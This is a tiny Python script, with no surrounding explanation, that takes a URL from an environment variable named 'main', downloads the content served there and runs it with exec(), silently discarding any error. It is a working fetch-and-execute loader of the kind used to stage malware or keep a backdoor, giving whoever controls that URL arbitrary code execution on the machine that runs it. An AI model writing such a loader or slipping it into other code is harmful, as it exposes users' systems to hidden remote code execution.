import os, requests, traceback
i = requests.get(os.environ['main'])
try:
  exec(i.content)
except:
  pass
